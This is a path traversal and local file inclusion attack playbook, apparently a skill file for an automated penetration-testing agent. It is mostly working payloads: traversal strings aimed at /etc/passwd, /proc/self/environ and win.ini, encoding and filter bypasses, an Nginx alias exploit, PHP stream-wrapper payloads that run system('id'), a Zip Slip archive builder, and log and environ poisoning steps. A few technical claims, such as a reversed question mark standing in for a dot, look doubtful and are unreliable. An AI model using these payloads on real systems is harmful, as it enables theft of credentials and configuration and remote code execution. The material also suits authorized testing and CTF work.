# Path Traversal

## Trigger

Load path-traversal methodology when ANY of these signals appear:
- URL parameters named `file`, `path`, `page`, `filename`, `download`, `template`, `include`, `doc`, `src`, `folder`, `view`, `load`, `read`, `showfile`
- URL patterns: `/download?file=`, `/getFile?path=`, `/view?page=`, `/include?template=`, `/static/`, `/uploads/`, `/files/`
- Error messages revealing file paths: `include(files/xxx.php): Failed to open stream`, `FileNotFoundException: /var/www/`, `No such file or directory`
- File serving endpoints that return binary content (PDFs, images, downloads) identified by Content-Disposition headers
- Technology: PHP, JSP/Java servlets, ASP.NET, Node.js Express `res.sendFile()`, Python Flask `send_file()`, Ruby `send_file`
- Source code or config leaking: `php://filter` being accepted, `.git` directory exposed, backup files (`file~`, `.swp`, `.bak`, `.orig`)
- Nginx alias directives, Apache RewriteRules, IIS virtual directories in server config leaks
- Web server responding with: `root:x:0:0:`, `[boot loader]`, `<?xml version="1.0"`, or `connectionString=` when a file-like path is requested

## Attack Surface

- File download/view endpoints that take a user-controlled path parameter
- Template rendering engines that accept a template file path from user input
- File inclusion in PHP (`include()`, `require()`, `include_once()`)
- Static file servers (Nginx, Apache, CDN) with misconfigured aliases or URL rewriting
- File upload processing where the upload path is derived from user input
- Archive extraction (ZIP/TAR) where filenames are not sanitized (Zip Slip)
- Image processing libraries that follow symbolic links in archives
- Any feature accepting a URL or file path for import/export/preview
- PHP stream wrappers (`php://filter`, `php://input`, `phar://`, `zip://`, `data://`)

## Decision Tree

```
1. Probe → Inject ../ sequences into discovered parameters
   ├─ Response contains /etc/passwd content → Path traversal confirmed
   ├─ Response is different length for ../ vs normal → Blind traversal likely
   └─ ../ completely blocked → Try bypass encoding

2. Determine depth → Escalate traversal depth
     Try 1, 2, 3, 4, 5+ levels of ../
     For /a/b/c/down.php from webroot: ../../../../
     For /download.jsp directly in webroot: ../

3. Read targets based on technology
   ├─ Linux: /etc/passwd, /proc/self/environ, config files
   ├─ Windows: /windows/win.ini, /boot.ini, web.config
   ├─ Java: /WEB-INF/web.xml, jdbc.properties
   └─ PHP: php://filter/convert.base64-encode/resource=config.php

4. If direct read fails → Try LFI → RCE escalation
     Log poisoning, php://input, data://, /proc/self/environ poisoning
```

## Techniques

### Basic Path Traversal (Linux)

```bash
../../../../etc/passwd
../../../../etc/hosts
../../../../proc/self/environ
../../../../proc/self/cmdline
```

### Basic Path Traversal (Windows)

```bash
../../../../windows/win.ini
../../../../windows/system32/drivers/etc/hosts
../../../../boot.ini
```

### URL Encoding

```bash
# Single encoding
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd

# Double encoding (bypasses one decode layer)
%252e%252e%252f%252e%252e%252fetc/passwd

# Triple encoding (bypasses two decode layers)
%25252e%25252e%25252fetc/passwd
```

### Unicode/UTF-8 Overlong Encoding

```bash
# Tomcat/GlassFish: %c0%ae = overlong encoding of "."
..%c0%ae..%c0%afetc/passwd
..%c1%9c..%c1%9cwindows\win.ini

# Fullwidth character bypass
..%ef%bc%8f..%ef%bc%8fetc/passwd

# U+2E2E homoglyph (REVERSED QUESTION MARK → .)
%25E2%25B8%25AE%25E2%25B8%25AE/etc/passwd
```

### Recursive-Replace Bypass (....//)

```
# Single-pass filter strips "../" once
# Payload: ....//....//....//flag
# After removal: ../  ../  ../  flag
```

### Null Byte Truncation (Legacy PHP < 5.3.4)

```bash
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
../../../../etc/passwd.php%00
```

### Nginx Alias Misconfiguration

```nginx
# Vulnerable: location /static { alias /var/www/public/; }
#                            ^ no trailing slash, but alias has one

# Exploit:
GET /static../.env HTTP/1.1
# Resolves to: /var/www/.env

# Test paths:
/static../
/assets../
/public../
/media../
/uploads../
/laravel../
```

### /dev/fd /proc Filter Bypass

```bash
# When /proc is blacklisted, use /dev/fd (symlink to /proc/self/fd)
/dev/fd/../environ
/dev/fd/../cmdline
/dev/fd/../status
/dev/fd/../cwd/app.py
/dev/stdin/../environ
```

### Python `os.path.join` Quirk

```python
# os.path.join("/app/static", "/etc/passwd")
# Returns: "/etc/passwd" (absolute path ignores the first argument!)

# If the app constructs: os.path.join(BASE_DIR, user_path)
# Send: /etc/passwd
# The base directory is discarded
```

### `basename()` Bypass

```python
# basename() removes directory components but doesn't filter hidden files
# If app does: $file = basename($_GET['file'])
# Send: .env  or  .lock  or  .htaccess
# basename(".env") = ".env"  -- passes through!
```

### Java `getCanonicalPath` vs `getAbsolutePath`

```java
// File("/app/public/../../etc/passwd").getCanonicalPath()
// Returns: /etc/passwd (normalized)

// File("/app/public/../../etc/passwd").getAbsolutePath()
// Returns: /app/public/../../etc/passwd (NOT normalized, used for display)

// If validation uses getAbsolutePath() but access uses getCanonicalPath():
// Send: /app/public/../../etc/passwd
// getAbsolutePath() checks literally, getCanonicalPath() resolves traversal
```

### Zip/TAR Path Traversal (Zip Slip)

```python
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as zf:
    zf.writestr('../../../../tmp/exploit.sh', 'malicious content')
```

### PHP Stream Wrappers (LFI)

```bash
# Read PHP source code without execution
php://filter/convert.base64-encode/resource=config.php

# Write POST body as PHP code
php://input          # POST: <?php system('id'); ?>

# Data URI scheme
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpPz4=

# Zip archive inclusion
zip://uploads/shell.zip%23shell.txt

# Phar deserialization
phar://uploads/exploit.phar
```

### Base64-Encoded Path Traversal

```python
import base64
# ../index.php
print(base64.b64encode(b"../index.php").decode())  # Li4vaW5kZXgucGhw
# ../../../../etc/passwd
print(base64.b64encode(b"../../../../etc/passwd").decode())
```

### IIS Virtual Directory / Short Name

```bash
# IIS 8.3 short filename bypass
# Long name "important.txt" -> short name "IMPORT~1.TXT"
# If filter blocks "important", use "IMPORT~1.TXT"

# Windows 8.3 name generation example:
# "flag_2024.txt" -> "FLAG_2~1.TXT"
```

## Bypass

### Filter Evasion Summary

| Filter | Bypass |
|--------|--------|
| `../` blocked | URL encode, double encode, `....//`, `..\../`, `..;/` |
| `.php` appended | Null byte `%00`, path truncation, `?` param, `#` fragment |
| Keyword `etc/passwd` blocked | `/etc/./passwd`, `/etc//passwd`, `/Etc/PasSwd` (case on Windows) |
| `../` count limited | Absolute path `/etc/passwd`, nested `....//` |
| `/proc` blacklisted | `/dev/fd/../`, `/dev/stdin/../` |
| Extension whitelist | `%00.jpg`, `/.jpg`, `;.jpg` (IIS), Unicode encoding |
| Single-pass `str_replace` | `....//` (recursive bypass via nested `../`) |

### Chained Absolute Path

```
# If relative traversal is blocked, use absolute:
file:///etc/passwd
/etc/passwd
```

### Mixed Slash for Windows/IIS

```
..\..\..\windows\win.ini
..\\..\\..\\windows\\win.ini
..%5c..%5c..%5cwindows\win.ini
```

## Verification

- Response contains `root:x:0:0:` confirms `/etc/passwd` access
- Response contains `[fonts]` or `[extensions]` confirms Windows file read
- Response contains `<?xml version="1.0" encoding="UTF-8"?>` with `<web-app>` confirms Java `web.xml`
- Response length difference between `../` probe and normal probe confirms traversal (blind)
- `php://filter` returns base64-encoded content — decode to verify PHP source leak
- Nginx alias test: `GET /<path>../.env` returning 200 confirms the misconfiguration

## Pitfalls

- Nginx decodes `%2f` in URL path BEFORE route matching — but does NOT decode it before filesystem access, causing a mismatch between the route and the resolved path
- PHP `realpath()` resolves all `..` and symlinks before checking — use `php://filter` to bypass `include()` suffix appending
- Python `os.path.join` drops everything before an absolute path — provide `/etc/passwd` directly when the app joins user input with a base directory
- Java `File.getCanonicalPath()` resolves symlinks — but `File.getAbsolutePath()` does NOT — validation using the wrong method creates exploitable discrepancies
- Windows case-insensitive filesystem: `C:\Windows\win.ini` == `c:\windows\WIN.INI` — any case variation works
- IIS + PHP: `%c1%9c` overlong encoding maps to `\` on UTF-8 systems with specific codepages (shift-JIS, GBK)
- Nginx alias traversal requires the `location` directive to lack a trailing slash while the `alias` has one — this is NOT exploitable when both have matching formats
- `proc/self/environ` poisoning is blind — you must inject PHP code via User-Agent THEN include the file
